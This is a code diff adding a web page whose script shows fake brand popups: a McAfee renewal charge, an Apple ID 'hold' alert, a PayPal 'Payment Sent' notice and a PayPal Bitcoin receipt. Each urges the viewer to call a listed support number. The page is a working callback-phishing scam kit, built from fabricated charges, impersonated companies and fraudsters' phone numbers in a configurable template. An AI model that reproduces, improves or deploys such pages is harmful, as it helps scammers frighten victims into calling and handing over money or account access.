+          <path fill="#0079C1" d="M21.285 3.203A6.126 6.126 0 0 0 19.16 1.34c-1.144-.652-2.73-.85-4.49-.85H8.718a.64.64 0 0 0-.632.541l-3.102 19.64A.64.64 0 0 0 5.618 21.4h3.705l1.092-6.905a.64.64 0 0 1 .632-.54h1.724c3.31 0 5.922-1.42 6.78-4.58.55-2.02.26-4.04-.63-5.59L21.285 3.2z"/>
+        </svg>
+        PayPal
+      </div>
+      <div class="p5-title" id="p5Title"></div>
+      
+      <div class="p5-top-info">
+        <div style="flex: 1; padding-right: 10px;">
+          <div class="p5-label">FROM:</div>
+          <div class="p5-val" id="p5SenderName"></div>
+          <div class="p5-val-sub" id="p5SenderAddress"></div>
+        </div>
+        <div style="flex: 1; text-align: right;">
+          <div class="p5-label">RECEIPT ID:</div>
+          <div class="p5-val" id="p5ReceiptId"></div>
+          <div class="p5-label" style="margin-top:8px;">DATE:</div>
+          <div class="p5-val" id="p5Date"></div>
+        </div>
+      </div>
+
+<div class="p5-total-box">
+  <div class="p5-label" id="p5TotalTitle"></div>
+  <div class="p5-total-amt">
+    <span class="p5-total-currency">USD</span>
+    <span class="p5-total-dollar">$</span>
+    <span class="p5-total-value" id="p5TotalAmount"></span>
+  </div>
+</div>
+
+      <div class="p5-success-box">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#22c55e" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1.17-6.5l6.36-6.36-1.41-1.42-4.95 4.95-2.12-2.12-1.42 1.42 3.54 3.53z"/>
+        </svg>
+        <span class="p5-success-msg" id="p5SuccessMsg"></span>
+      </div>
+      <div class="p5-sub-msg" id="p5SubMsg"></div>
+
+      <div class="p5-support-box">
+        <div class="p5-support-text" id="p5SupportText"></div>
+        <a href="#" id="p5PhoneLink" class="p5-support-phone"></a>
+      </div>
+
+      <div class="p5-table">
+        <div class="p5-th">
+          <span class="p5-flex-2">DESCRIPTION</span>
+          <span class="p5-flex-1-center">QTY</span>
+          <span class="p5-flex-1-right">PRICE</span>
+        </div>
+        <div class="p5-tr">
+          <span class="p5-flex-2" id="p5ItemDesc"></span>
+          <span class="p5-flex-1-center" id="p5ItemQty"></span>
+          <span class="p5-flex-1-right" id="p5ItemPrice"></span>
+        </div>
+        
+        <div class="p5-tf-centered">
+          <span>TOTAL</span>
+          <span id="p5TotalAmountBottom"></span>
+        </div>
+      </div>
+
+      <div class="p5-disclaimer" id="p5DisclaimerText"></div>
+      <div class="p5-copyright" id="p5CopyrightText"></div>
+
+    </div>
+  </div>
+
+  <script>
+  (function () {
+    var printBtn       = document.getElementById('printBtn');
+    var downloadPdfBtn = document.getElementById('downloadPdfBtn');
+    if (printBtn)       printBtn.addEventListener('click', function(e){ e.preventDefault(); window.print(); });
+    if (downloadPdfBtn) downloadPdfBtn.addEventListener('click', function(e){ e.preventDefault(); window.print(); });
+
+    var popup = {"enabled":true,"selectedTemplate":"popup5","p1Brand":"McAfee","p1HeaderTitle":"Payment Confirmation","p1SuccessTitle":"Payment Successful","p1SuccessSubtitle":"Your McAfee subscription has been renewed","p1AmountLabel":"Amount Charged","p1Amount":"$298.78","p1CallLabel":"CALL FOR HELP","p1Phone":"+1 (801) 340-5427","p1AvailText":"Customer Care — Available 24/7","p1ViewReceiptText":"View Receipt","p1CallNowText":"Call Now","p2Phone":"+1-833-666-2837","p2Message":"Your Apple ID was recently used at the Apple Store for a $348.67 transaction via Apple Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Apple Support immediately to secure your account and prevent unauthorized activity.","p2CallNowText":"Call Now","p2OkText":"OK","p2CancelText":"Cancel","p3Title":"Alert","p3Message":"Your request has been received successfully.","p3CancelText":"Cancel","p3OkText":"OK","p3BottomLabel":"Call Now","p3BottomPhone":"1-877-917-2167","p4SendingTo":"DAVID WILSON","p4Amount":"$799.99","p4Title":"Payment Sent","p4Message":"Your payment to DAVID WILSON has been processed successfully using PayPal.","p4TransactionId":"nxjijfa3-snwgb-xnmypo","p4InvoiceId":"INV-41KR62JY7IP","p4StatusText":"Completed ✅","p4DownloadBtnText":"Download Receipt","p4CallBtnText":"Call Now","p4NoteTitle":"⚠️ Note:","p4NoteText1":"This was an automated payment triggered by clicking a Money Request Link.","p4NoteText2":"If you did not intend this payment, contact PayPal Customer Support:","p4Phone":"+1(806) 307-3874","p5Title":"Payment Receipt","p5SenderName":"PayPal, Inc.","p5SenderAddress":"2211 North First Street, San Jose, CA 95131","p5ReceiptId":"584463298103","p5Date":"27 April 2026","p5TotalTitle":"TOTAL:","p5TotalAmount":"USD $349.47","p5SuccessMsg":"Payment completed successfully.","p5SubMsg":"This transaction may take a few moments to appear in your account.","p5SupportText":"If you have questions, please contact PayPal","p5Phone":"1-646-325-3121","p5ItemDesc":"Bitcoin Purchase","p5ItemQty":"0.0054 BTC","p5ItemPrice":"$349.47","p5DisclaimerText":"If you do not recognize this transaction, contact support immediately.","p5CopyrightText":"© 2026 PayPal Inc. All rights reserved."};
+    if (!popup.enabled) return;
+
+    /* ── Helper ── */
+    function digitsOnly(s) { return String(s || '').replace(/[^\d+]/g, ''); }
+
+    /* ── Fill Popup 1 (McAfee) ── */
+    document.getElementById('p1Brand').textContent            = popup.p1Brand           || 'McAfee';
+    document.getElementById('p1HeaderTitle').textContent      = popup.p1HeaderTitle     || 'Payment Confirmation';
+    document.getElementById('p1SuccessTitle').textContent     = popup.p1SuccessTitle    || 'Payment Successful';
+    document.getElementById('p1SuccessSubtitle').textContent  = popup.p1SuccessSubtitle || '';
+    document.getElementById('p1AmountLabel').textContent      = popup.p1AmountLabel     || 'Amount Charged';
+    document.getElementById('p1Amount').textContent           = popup.p1Amount          || '$298.78';
+    document.getElementById('p1CallLabel').textContent        = popup.p1CallLabel       || 'CALL FOR HELP';
+    document.getElementById('p1AvailText').textContent        = popup.p1AvailText       || 'Customer Care — Available 24/7';
+    document.getElementById('mcafeeViewReceipt').textContent  = popup.p1ViewReceiptText || 'View Receipt';
+    document.getElementById('p1CallNowText').textContent      = popup.p1CallNowText     || 'Call Now';
+
+    var p1PhoneLink = document.getElementById('p1PhoneLink');
+    p1PhoneLink.textContent = popup.p1Phone || '';
+    p1PhoneLink.href = 'tel:' + digitsOnly(popup.p1Phone);
+
+    document.getElementById('mcafeeCallNow').addEventListener('click', function() {
+      window.location.href = 'tel:' + digitsOnly(popup.p1Phone);
+    });
+
+    /* ── Fill Popup 2 (Apple Support) ── */
+    document.getElementById('p2CallNowText').textContent = popup.p2CallNowText || 'Call Now';
+    document.getElementById('p2OkBtn').textContent       = popup.p2OkText      || 'OK';
+    document.getElementById('p2CancelBtn').textContent   = popup.p2CancelText  || 'Cancel';
+
+    var msgEl = document.getElementById('p2MessageEl');
+    var rawMsg = popup.p2Message || '';
+    var phonePattern = /(\+?[\d][\d\s\-(). ]{6,}[\d])/g;
+    var detectedPhone = (rawMsg.match(phonePattern) || [])[0] || popup.p2Phone || '';
+    var dialNumber = detectedPhone.replace(/[^\d+]/g, '');
+
+    if (detectedPhone) {
+      var phoneLink = '<a href="tel:' + dialNumber + '" class="apple-phone-link">' + detectedPhone + '</a>';
+      msgEl.innerHTML = rawMsg.replace(detectedPhone, phoneLink);
+    } else {
+      msgEl.textContent = rawMsg;
+    }
+
+    var p2CallBtn = document.getElementById('p2CallBtn');
+    p2CallBtn.href = 'tel:' + dialNumber;
+
+    /* ── Fill Popup 3 ── */
+    document.getElementById('p3Title').textContent     = popup.p3Title      || 'Alert';
+    document.getElementById('p3Message').textContent   = popup.p3Message    || 'Your request has been received successfully.';
+    document.getElementById('p3CancelBtn').textContent = popup.p3CancelText || 'Cancel';
+    document.getElementById('p3OkBtn').textContent     = popup.p3OkText     || 'OK';
+
+    document.getElementById('p3BottomLabel').textContent = popup.p3BottomLabel || 'Call Now';
+    document.getElementById('p3BottomPhone').textContent = popup.p3BottomPhone || '1-877-917-2167';
+
+    var p3BottomBar = document.getElementById('p3BottomBar');
+    p3BottomBar.href = 'tel:' + digitsOnly(popup.p3BottomPhone || '1-877-917-2167');
+
+    /* ── Fill Popup 4 (PayPal) ── */
+    document.getElementById('p4SendingTo').textContent       = popup.p4SendingTo       || 'DAVID WILSON';
+    document.getElementById('p4Amount').textContent          = popup.p4Amount          || '$799.99';
+    document.getElementById('p4Title').textContent           = popup.p4Title           || 'Payment Sent';
+    document.getElementById('p4Message').textContent         = popup.p4Message         || '';
+    document.getElementById('p4TransactionId').textContent   = popup.p4TransactionId   || '';
+    document.getElementById('p4InvoiceId').textContent       = popup.p4InvoiceId       || '';
+    document.getElementById('p4StatusText').textContent      = popup.p4StatusText      || 'Completed ✅';
+    document.getElementById('p4DownloadBtnText').textContent = popup.p4DownloadBtnText || 'Download Receipt';
+    document.getElementById('p4CallBtnText').textContent     = popup.p4CallBtnText     || 'Call Now';
+    document.getElementById('p4NoteTitle').textContent       = popup.p4NoteTitle       || '⚠️ Note:';
+    document.getElementById('p4NoteText1').textContent       = popup.p4NoteText1       || '';
+    document.getElementById('p4NoteText2').textContent       = popup.p4NoteText2       || '';
+
+    var p4PhoneLink = document.getElementById('p4PhoneLink');
+    p4PhoneLink.textContent = popup.p4Phone || '';
+
+    var dialNumberP4 = 'tel:' + digitsOnly(popup.p4Phone || '');
+    p4PhoneLink.href = dialNumberP4;
+    document.getElementById('p4CallBtn').href = dialNumberP4;
+
+    /* ── Fill Popup 5 (PayPal Crypto) ── */
+    document.getElementById('p5Title').textContent             = popup.p5Title;
+    document.getElementById('p5SenderName').textContent        = popup.p5SenderName;
+    document.getElementById('p5SenderAddress').textContent     = popup.p5SenderAddress;
+    document.getElementById('p5ReceiptId').textContent         = popup.p5ReceiptId;
+    document.getElementById('p5Date').textContent              = popup.p5Date;
+    document.getElementById('p5TotalTitle').textContent        = popup.p5TotalTitle;
+document.getElementById('p5TotalAmount').textContent =
+  String(popup.p5TotalAmount || '')
+    .replace(/^USDs*/i, '')
+    .replace('$', '')
+    .trim();
+    document.getElementById('p5SuccessMsg').textContent        = popup.p5SuccessMsg;
+    document.getElementById('p5SubMsg').textContent            = popup.p5SubMsg;
+    document.getElementById('p5SupportText').textContent       = popup.p5SupportText;
+    document.getElementById('p5ItemDesc').textContent          = popup.p5ItemDesc;
+    document.getElementById('p5ItemQty').textContent           = popup.p5ItemQty;
+    document.getElementById('p5ItemPrice').textContent         = popup.p5ItemPrice;
+document.getElementById('p5TotalAmountBottom').textContent =
+  String(popup.p5TotalAmount || '')
+    .replace(/^USDs*/i, '')
+    .trim();
+    document.getElementById('p5DisclaimerText').textContent    = popup.p5DisclaimerText;
+    document.getElementById('p5CopyrightText').textContent     = popup.p5CopyrightText;
+    
+    var p5PhoneLink = document.getElementById('p5PhoneLink');
+    p5PhoneLink.textContent = popup.p5Phone || '';
+    p5PhoneLink.href = 'tel:' + digitsOnly(popup.p5Phone || '');
+
+    /* ═══════════════════════════════════════
+       POPUP LOGIC
+    ═══════════════════════════════════════ */
+    var selectedTemplate = popup.selectedTemplate || 'popup1';
+
+    if (selectedTemplate === 'popup1') {
+      document.getElementById('mcafeeOverlay').classList.add('show');
+    } else if (selectedTemplate === 'popup2') {
+      document.getElementById('appleSupportOverlay').classList.add('show');
+    } else if (selectedTemplate === 'popup4') {
+      document.getElementById('p4Overlay').classList.add('show');
+    } else if (selectedTemplate === 'popup5') {
+      document.getElementById('p5Overlay').classList.add('show');
+    } else if (selectedTemplate === 'popup3') {
+      var p3Overlay   = document.getElementById('p3Overlay');
+      var p3OkBtn     = document.getElementById('p3OkBtn');
+      var p3CancelBtn = document.getElementById('p3CancelBtn');
+
+      p3Overlay.classList.add('show');
+
+      var bannerShown = false;
+
+      document.addEventListener('click', function onDocClick(e) {
+        if (bannerShown) return;
+        bannerShown = true;
+        p3BottomBar.classList.add('show');
+      }, true);
+    }
+
+  })();
+  </script>
+</body>
+</html>
